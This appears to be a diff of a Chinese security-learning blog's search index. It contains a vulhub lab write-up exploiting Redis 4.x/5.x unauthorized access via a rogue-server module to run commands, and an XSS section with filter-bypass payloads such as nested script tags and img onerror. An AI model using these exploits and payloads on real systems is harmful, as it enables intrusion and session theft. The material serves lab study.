-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
-<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
-<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
-<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
-<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
-<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
-<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
-<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
-<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
-<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
-<p>返回到<code>redis-rogue-server.py</code>目录下</p>
-<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
-<p><img src="https://i.loli.net/2021/06/28/u1UFq7KBPRaIC8p.png" alt="image-20210628145723698"></p>
-<p>然后就卡住了。。</p>
-<p>换了个exp</p>
-<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
-<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
-<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
-<p><img src="https://i.loli.net/2021/06/28/7Rr1X2tn9oMcCYb.png" alt="image-20210628200252772"></p>
-<p>然后就又卡住了。。。</p>
-<h2 id="在另一台kali上搭建docker"><a href="#在另一台kali上搭建docker" class="headerlink" title="在另一台kali上搭建docker"></a>在另一台kali上搭建docker</h2><p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
-<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
-<p>最后也是糊里糊涂添加了一堆源</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
-<p>然后就可以了。。。淦</p>
-<p>直连成功</p>
-<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
-<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
-<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
-<p>不过是<code>eredis</code>是什么鬼？？？</p>
-<p>第一个exp也可以利用</p>
-<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
-<blockquote>
-<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
-</blockquote>
-<p>考完就尝试另外三个方法</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
-<p><a href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
-<p><a href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>redis</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web基础学习</title>
     <url>/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="web基础之信息收集"><a href="#web基础之信息收集" class="headerlink" title="web基础之信息收集"></a>web基础之信息收集</h1><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>whois查询和备案信息</p>
@@ -541,7 +541,7 @@
 ]]></content>
   </entry>
   <entry>
-    <title>xss学习</title>
+    <title>常见web漏洞学习之xss学习</title>
     <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
 <p>跨站脚本攻击，就是将恶意代码嵌入到前端js代码中（反射型，DOM型）或是数据库中（存储型）当用户点击或访问就会触发xss代码执行，盗取用户cookies或session</p>
@@ -588,9 +588,21 @@
 <p><code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>
 <p>点击<code>&#39;&gt;就让往事都随风,都随风吧</code></p>
 <p><img src="https://i.loli.net/2021/07/14/J84TmvBj1bE2lQR.png" alt="image-20210714151950066"></p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>贴一段师傅源码</p>
+<p>区分大小写过滤<code>&lt;script&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action4.php：</span><br><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&quot;name&quot;]; </span><br><span class="line">if($name!=null)&#123;</span><br><span class="line">	$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">	$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	echo $name; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="嵌套-lt-script-gt-标签绕过"><a href="#嵌套-lt-script-gt-标签绕过" class="headerlink" title="嵌套&lt;script&gt;标签绕过"></a>嵌套<code>&lt;script&gt;</code>标签绕过</h4><p>其他源码同上，加了一个<code>i</code>，不区分大小写过滤<code>&lt;script&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<h4 id="过滤所有内容"><a href="#过滤所有内容" class="headerlink" title="过滤所有内容"></a>过滤所有内容</h4><p>其他源码同上</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script及其之间的所有内容</span><br></pre></td></tr></table></figure>
+<p>虽然script标签不能使用了，但img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码</p>
+<p>payload<code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p>
+<p>其他继续补充</p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://c.biancheng.net/view/3274.html">HTML DOM是什么</a></p>
 <p><a href="https://blog.csdn.net/witwitwiter/article/details/115797971">Pikachu靶场：DOM型XSS以及DOM型XSS-X</a></p>
 <p><a href="https://www.cnblogs.com/fairyting/p/12630548.html">DOM型XSS（pikachu）</a></p>
+<p><a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p>
 ]]></content>
       <categories>
         <category>xss</category>
@@ -600,7 +612,7 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传知识点总结</title>
+    <title>常见web漏洞学习之文件上传知识点总结</title>
     <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
 <p>.htacess的Apache解析漏洞</p>
@@ -1120,7 +1132,7 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入学习</title>
+    <title>常见web漏洞学习之sql注入学习</title>
     <url>/2021/05/06/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="常见web漏洞学习之sql注入学习"><a href="#常见web漏洞学习之sql注入学习" class="headerlink" title="常见web漏洞学习之sql注入学习"></a>常见web漏洞学习之sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
 <p>字符型注入</p>
